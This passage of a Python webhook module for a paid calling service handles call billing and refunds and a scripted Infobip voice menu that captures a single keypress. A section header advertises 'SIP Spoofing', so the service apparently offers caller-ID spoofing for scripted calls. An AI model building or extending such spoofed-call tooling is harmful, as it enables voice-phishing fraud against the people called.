                    logger.info(f"💰 Call {call_id} FAILED: Refunded ${refund_amount} to user {user['uid']}. New balance: ${new_balance}")
                    
                else:
                    # All other statuses (no-answer, busy, canceled) - keep 1st minute charge, no additional
                    total_cost = already_charged
                    billing_message = f'💰 Charged ${total_cost:.2f} (1 minute minimum) - No refund'
                    logger.info(f"💰 Call {call_id} {call_status}: Kept 1st minute charge ${total_cost} (no refund)")
                
                # Update call with final billing info
                billing_update = {
                    'billing_status': 'refunded' if call_status == 'failed' else 'charged',
                    'total_cost': total_cost,
                    'additional_charge': additional_charge,
                    'refund_amount': refund_amount,
                    'billed_at': datetime.utcnow().isoformat()
                }
                await MongoDBService.update_call_data(call_id, billing_update)
                
                # Send billing event to user
                billing_event = {
                    'time': datetime.utcnow().isoformat(),
                    'event': 'billing_processed',
                    'message': billing_message,
                    'data': {
                        'total_cost': total_cost,
                        'additional_charge': additional_charge,
                        'refund_amount': refund_amount,
                        'duration_seconds': call_duration,
                        'status': call_status
                    }
                }
                await MongoDBService.update_call_events(call_id, billing_event)
                await manager.send_to_user(call_data['user_id'], {
                    'type': 'billing_update',
                    'call_id': call_id,
                    'event': billing_event,
                    'new_balance': user['balance']
                })
            
            # If call completed, remove from active calls
            if call_status in ['completed', 'failed', 'busy', 'no-answer', 'canceled']:
                active_calls.pop(call_id, None)
        
        return Response(content="OK", media_type="text/plain")
    
    except Exception as e:
        logger.error(f"Status webhook error: {e}")
        return Response(content="OK", media_type="text/plain")


# =====================================================
# INFOBIP WEBHOOKS (Regular + SIP Spoofing)
# =====================================================

@router.post("/infobip/{call_id}")
async def infobip_webhook(call_id: str, request: Request):
    """Main webhook for Infobip calls - Step 1"""
    try:
        # Get call from MongoDB
        call_data = await MongoDBService.get_call(call_id)
        
        if not call_data:
            return Response(content='{"say":[{"text":"Call not found"}],"hangup":{}}', media_type="application/json")
        
        voice = call_data.get('tts_voice', 'Aurora')
        language = call_data.get('language', 'en-US')
        step_1_message = call_data.get('step_1_message', 'Hello')
        
        voice_map = {'Aurora': 'Joanna', 'Chirp': 'Matthew', 'woman': 'Joanna', 'man': 'Matthew'}
        infobip_voice = voice_map.get(voice, 'Joanna')
        
        backend_url = os.getenv('BACKEND_URL', 'https://lanjutkan-ini.preview.emergentagent.com')
        first_input_url = f"{backend_url}/api/webhooks/infobip/{call_id}/first-input"
        
        response_json = {
            "say": [{"text": step_1_message, "language": language, "voice": infobip_voice}],
            "capture": {"maxLength": 1, "timeout": 10000, "actionUrl": first_input_url}
        }
        
        logger.info(f"Infobip webhook {call_id}: Step 1")
        return Response(content=json.dumps(response_json), media_type="application/json")
    except Exception as e:
        logger.error(f"Infobip webhook error: {e}")
        return Response(content='{"say":[{"text":"Error"}],"hangup":{}}', media_type="application/json")

@router.post("/infobip/{call_id}/first-input")
async def infobip_first_input(call_id: str, request: Request):
    """Handle first digit (1 or 0)"""
    try:
        body = await request.json()
        digits = body.get('dtmf', {}).get('digits', '')
        
        backend_url = os.getenv('BACKEND_URL', 'https://lanjutkan-ini.preview.emergentagent.com')
        
        if digits == '1':
            deny_url = f"{backend_url}/api/webhooks/infobip/{call_id}/deny"
            return Response(content=json.dumps({"goto": deny_url}), media_type="application/json")
        elif digits == '0':
            accept_url = f"{backend_url}/api/webhooks/infobip/{call_id}/accept"
            return Response(content=json.dumps({"goto": accept_url}), media_type="application/json")
        else:
            return Response(content='{"say":[{"text":"Invalid input"}],"hangup":{}}', media_type="application/json")
    except Exception as e:
        logger.error(f"Infobip first-input error: {e}")
        return Response(content='{"say":[{"text":"Error"}],"hangup":{}}', media_type="application/json")

@router.post("/infobip/{call_id}/status")
async def infobip_status_webhook(call_id: str, request: Request):
    """Infobip status callback"""
    try:
        body = await request.json()
        status = body.get('status', '')
        
        # Update call status in MongoDB
        call_data = await MongoDBService.get_call(call_id)
        if call_data:
            await MongoDBService.update_call_status(call_id, status.lower())
            logger.info(f"Infobip call {call_id} status: {status}")
        
        return Response(content="OK", media_type="text/plain")
    except Exception as e:
        logger.error(f"Infobip status error: {e}")
        return Response(content="Error", media_type="text/plain")
